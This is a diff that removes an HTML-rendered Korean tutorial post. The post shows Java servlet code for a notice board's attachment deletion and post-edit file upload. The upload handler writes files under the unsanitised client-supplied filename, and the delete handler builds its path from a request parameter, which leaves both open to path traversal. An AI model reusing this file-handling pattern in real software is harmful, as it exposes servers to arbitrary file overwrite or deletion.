-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filePath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separatorChar</span><span class="o">+</span><span class="n">filename</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 존재 안함!"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일이 아님!"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 삭제 하기.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="s">"success"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">re</span> <span class="o">=</span> <span class="s">"fail"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\""</span><span class="o">+</span><span class="n">re</span><span class="o">+</span><span class="s">"\"}"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<p><br /></p>
-<ul>
-  <li>수정 게시글 저장하기</li>
-  <li>폴더 명을 변경하여 변경한 폴더에 사용자가 보낸 파일을 저장한다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 수정 저장하기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"POST"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardModifySave</span><span class="o">))</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 전 저장위치</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSID</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">beforeFolderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">noticeSID</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">beforeUploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">beforeFolderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 삭제</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">noticeDAO</span><span class="o">.</span><span class="na">deleteNotice</span><span class="o">(</span><span class="n">sid</span><span class="o">)){</span> <span class="c1">// 삭제 실패</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 새로운 글 저장</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">genTime</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newSid</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">saveNotice</span><span class="o">(</span><span class="n">user</span><span class="o">,</span> <span class="n">title</span><span class="o">,</span> <span class="n">mainText</span><span class="o">,</span> <span class="n">genTime</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">newSid</span><span class="o">==</span><span class="mi">0</span><span class="o">){</span> <span class="c1">// 실패</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('fail');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span>   
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"no new file"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">beforeUploadPath</span><span class="o">);</span> <span class="c1">// 폴더</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newFolderName</span> <span class="o">=</span> <span class="n">genTime</span><span class="o">+</span><span class="s">"_"</span><span class="o">+</span><span class="n">newSid</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">afterUploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">newFolderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newFolder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">afterUploadPath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 이름만 변경.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">folder</span><span class="o">.</span><span class="na">renameTo</span><span class="o">(</span><span class="n">newFolder</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">parts</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParts</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="nl">part:</span><span class="n">parts</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"filename="</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">newFolder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">newFolder</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">newSid</span><span class="o">+</span><span class="s">"게시글 폴더 생성 함"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">count</span> <span class="o">=</span> <span class="n">newFolder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">().</span><span class="na">length</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 갯수 : "</span><span class="o">+</span><span class="n">count</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="no">MAX_FILE_NUM</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"최대 파일 갯수 초과"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"out of file number ( maxcount 3 )"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"퐅더 존재? =&gt; "</span><span class="o">+</span><span class="n">newFolder</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"타입 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">));</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"크기 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSize</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"이름 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">afterUploadPath</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span> <span class="c1">// 임시 파일 삭제</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 저장 성공"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload success"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"경로 : "</span><span class="o">+</span><span class="n">afterUploadPath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload fail"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
